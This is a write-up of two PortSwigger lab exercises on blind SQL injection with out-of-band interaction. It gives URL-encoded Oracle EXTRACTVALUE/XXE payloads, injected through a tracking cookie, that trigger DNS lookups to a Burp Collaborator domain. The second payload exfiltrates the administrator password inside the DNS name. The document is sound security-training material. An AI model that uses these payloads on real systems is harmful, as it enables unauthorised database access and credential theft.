## **PortSwigger - Blind SQLi With Out Of Band Techniques**


Out-of-Band SQL Injection (OAST) allows the attacker to leverage out-of-band communication to extract information from the database by initiating communication between the compromised application and a separate system controlled by the attacker. This communication typically occurs through different means such as DNS queries, HTTP requests, or other network interactions. 

In the context of Blind SQLi an attacker might inject malicious code into an applications input field which then triggers communication to an external server under the attacker's control. This server can be set up to capture the communication or responses triggered by the injected query and by monitoring these interactions the attacker can infer whether their injected queries were successful or not. For example the attacker might inject a malicious SQL query that triggers DNS queries to a domain they control and by monitoring the DNS server logs they can gather information from the database indirectly. 

---

**Labs**

*Blind SQL Injection With Out-Of-Band Interaction* 

![lab1](/docs/assets/images/portswigger/sqli/blindsqli/outofband/oob01.png)

Since the vulnerability is within the tracking cookie I'll need to browse the HTTP history for a request that contains that parameter. In my case I chose to work off of the `GET /` request and send that to the repeater. I also went and started the collaborator. 

![get /](/docs/assets/images/portswigger/sqli/blindsqli/outofband/oob02.png)

![colaborator](/docs/assets/images/portswigger/sqli/blindsqli/outofband/oob03.png)

In the repeater I'll need to craft a SQL query that will trigger a DNS look up: 

`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//oiatxjtxyq8uy2s8fw08qla2etkk8bw0.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--` 

`TrackingId=x'` This sets the cookie parameter to a value of `x` and the single quote `'` is used to close the original SQL query. `UNION` is the keyword used to combine the results of two SQL queries. `SELECT EXTRACTVALUE` is an attempt to extract a data value. `(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>` is the XML declaration that specifies the XML version and encoding, since It's URL encoded `%3f` represents the question mark `?` character and `%3d` represents then equal sign `=`.  `<!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//oiatxjtxyq8uy2s8fw08qla2etkk8bw0.oastify.com/">+%25remote%3b]>'),'/l')` is the XML document type declaration (DTD). It defines an external entity referenced named `%remote` that points to the remote URL associated with the collaborator `/oiatxjtxyq8uy2s8fw08qla2etkk8bw0.oastify.com`, `FROM+dual` is the SQL clause that specifies the source of the data to be selected, `dual` is often used in SQLi when the attacker doesn't hav ea specific table to query. Finally the double hyphen `--` at the end is a comment marker used to comment out the rest of the original query to prevent any potential errors. 

![repeater](/docs/assets/images/portswigger/sqli/blindsqli/outofband/oob04.png)

I can observe that after forwarding the request the server responds with a `200 OK` and I can now see the DNS traffic in the log for the collaborator. 

![dns query](/docs/assets/images/portswigger/sqli/blindsqli/outofband/oob05.png)

Since all the lab requires is to make the server send a DNS query to an external entity this satisfies the challenge for this lab. 

![lab1 solved](/docs/assets/images/portswigger/sqli/blindsqli/outofband/oob06.png)

---

*Blind SQL Injection With Out-Of-Band Data Exfiltration* 

![lab1 intro](/docs/assets/images/portswigger/sqli/blindsqli/outofband/oob07.png)

To start this lab off I found a request with the vulnerable tracking cookie and sent it to the repeater. In my case it was a `GET /` request. I also took the time to start the collaborator. 

![get /](/docs/assets/images/portswigger/sqli/blindsqli/outofband/oob08.png)

![start collaborator](/docs/assets/images/portswigger/sqli/blindsqli/outofband/oob09.png)

To solve this lab I just need to modify the payload so that it will attempt to retrieve the password of the administrator user form the users table and include it in the URL for the XML entity reference. This can be done by inserting `(SELECT+password+FROM+users+WHERE+username%3d'administrator')` between a set of double pipes `||` just before the address to the collaborator. The collaborator address also needs to be prefixed with a period `.` so that the results of the `SELECT` query can be appended to it.  

`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.198fv2v2wwmw8icnjlwqqpingem5avyk.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--` 

![repeater](/docs/assets/images/portswigger/sqli/blindsqli/outofband/oob10.png)

Back in the collaborator I can observe the results of the SQL query and see that the password `acs729z9lqmelxrjhxbl` has been appended to the address of my collaborator in the description of the DNS query. 

![dns query](/docs/assets/images/portswigger/sqli/blindsqli/outofband/oob11.png)

Logging in with the credentials `administrator:acs729z9lqmelxrjhxbl` solves the challenge for this lab. 

![lab2 solved](/docs/assets/images/portswigger/sqli/blindsqli/outofband/oob12.png)
